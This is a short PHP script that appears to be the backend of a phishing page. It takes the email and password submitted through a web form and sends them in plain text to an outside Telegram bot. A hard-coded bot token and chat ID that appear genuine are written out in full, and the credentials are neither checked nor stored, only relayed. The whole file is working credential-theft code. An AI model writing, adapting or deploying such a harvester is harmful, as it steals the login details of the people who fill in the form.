<?php
header('Content-Type: application/json');

// Get the data sent from JavaScript
$data = json_decode(file_get_contents('php://input'), true);

$email     = $data['email']     ?? '';
$password  = $data['password']  ?? '';

// === PUT YOUR REAL VALUES HERE ===
$botToken = '8786378979:AAGRhYMOzNoxO9QnGaYimC1Wp7gqNrwU-1w';
$chatId   = '6673308614';
// ================================

$message = "New Form Submission:\nemail: $email\npassword: $password";

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text'    => $message
];

$options = [
    'http' => [
        'header'  => "Content-Type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($postData)
    ]
];

$context  = stream_context_create($options);
$result   = file_get_contents($url, false, $context);

echo $result;
